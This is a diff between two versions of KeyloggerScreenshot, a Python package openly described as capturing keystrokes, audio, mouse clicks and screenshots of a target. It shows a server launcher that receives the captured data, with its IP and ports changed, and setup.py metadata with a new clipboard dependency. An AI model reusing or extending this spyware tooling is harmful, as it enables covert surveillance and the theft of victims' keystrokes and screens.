 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.5.0/demon_server.py` & `KeyloggerScreenshot-0.6.0/demon_server.py`

 * *Files 13% similar despite different names*

```diff
@@ -1,16 +1,16 @@
 import KeyloggerScreenshot as ks
 import threading
 
-ip = "192.168.0.70"
+ip = "127.0.0.1"
 server_photos = ks.ServerPhotos(ip, 1111)
 
-server_keylogger = ks.ServerKeylogger(ip, 2233, simulater=True)
+server_keylogger = ks.ServerKeylogger(ip, 2222, simulater=True)
 
-server_listener = ks.ServerListener(ip, 1133)
+server_listener = ks.ServerListener(ip, 3333)
 
 server_time = ks.Timer(ip, 4444)
 
 threading_server = threading.Thread(target=server_photos.start)
 threading_server.start()
 
 threading_server2 = threading.Thread(target=server_keylogger.start)
```

### Comparing `KeyloggerScreenshot-0.5.0/leo_gui.py` & `KeyloggerScreenshot-0.6.0/leo_gui.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.5.0/requirements.py` & `KeyloggerScreenshot-0.6.0/requirements.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.5.0/setup.py` & `KeyloggerScreenshot-0.6.0/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -6,20 +6,20 @@
     'Operating System :: Microsoft :: Windows :: Windows 10',
     'License :: OSI Approved :: MIT License',
     'Programming Language :: Python :: 3'
 ]
 
 setup(
     name='KeyloggerScreenshot',
-    version='0.5.0',
+    version='0.6.0',
     description='Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot',
     long_description_content_type="text/markdown",
     long_description=open('README.md').read() + '\n\n' + open('CHANGELOG.txt').read(),
     url='',
     author='Fawaz Bashiru',
     author_email='fawazbashiru@gmail.com',
     license='MIT',
     classifiers=classifiers,
     keywords='Keylogger',
     packages=find_packages(),
-    install_requires=['pynput', "pyautogui", "pyaudio", "BetterPrinting", "Pillow"]
+    install_requires=['pynput', "pyautogui", "pyaudio", "BetterPrinting", "Pillow", "pyperclip"]
 )
```

